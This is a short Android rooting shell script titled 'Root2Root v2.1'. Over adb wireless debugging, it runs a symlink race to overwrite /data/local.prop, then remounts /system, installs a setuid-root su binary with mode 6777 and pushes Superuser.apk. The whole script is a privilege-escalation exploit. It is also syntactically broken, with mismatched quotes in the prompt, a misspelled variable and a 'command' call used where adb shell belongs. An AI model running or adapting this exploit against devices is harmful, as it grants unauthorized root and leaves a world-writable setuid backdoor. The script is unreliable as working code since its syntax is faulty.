echo "

  _____             _   ___  _____             _   
 |  __ \           | | |__ \|  __ \           | |  
 | |__) |___   ___ | |_   ) | |__) |___   ___ | |_ 
 |  _  // _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
 | | \ \ (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
 |_|  \_\___/ \___/ \__|____|_|  \_\___/ \___/ \__|v2.1
 "
                                                   
                                                   





read -p 'Wirless debugging host and port" $Hort
adb connect $Hort
  command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"

if command "cat /data/local.prop"
	then echo "Succesfully rooted!"
	echo "Requires a reboot..."
	adb reboot
	sleep 2
	adb wait-for-device
	command "mount -o rw,remount /system"
	adb push /su-static /system/xbin/su
	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
	adb push /Superuser.apk /system/app/
	command "rm /data/local.prop"
	adb reboot
fi
